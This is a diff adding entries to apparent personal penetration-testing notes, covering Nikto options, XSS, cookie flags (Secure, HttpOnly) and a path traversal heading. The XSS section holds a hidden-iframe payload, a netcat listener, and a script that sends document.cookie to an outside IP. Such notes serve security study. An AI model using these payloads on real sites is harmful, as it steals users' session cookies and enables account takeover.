@@ -19,11 +19,21 @@ NIKTO - highly configurable open source web scanner; not designed for stealth
   -T control which types of tests we want to run
   
 
+==========================================================================================
+XSS
+<iframe src=http://1.2.3.4/random_file_name height=”0” width=”0”></iframe>
+nc -nvlp 80
 
+Cookie parameters
+Secure - Indicates that the cookie is sent to the server only when a request is made with the https: scheme/ resistant to MitM
+HttpOnly - Forbids JavaScript from accessing the cookie; Note that a cookie that has been created with HttpOnly will still be
+  sent with JavaScript-initiated requests, for example, when calling XMLHttpRequest.send() or fetch(). This mitigates attacks
+  against cross-site scripting (XSS).
+  
+<script>new Image().src="http://1.2.3.4/cat.jpg?output="+document.cookie;</script>
 
-
-
-
+==========================================================================================
+Path travesal
 
 
 
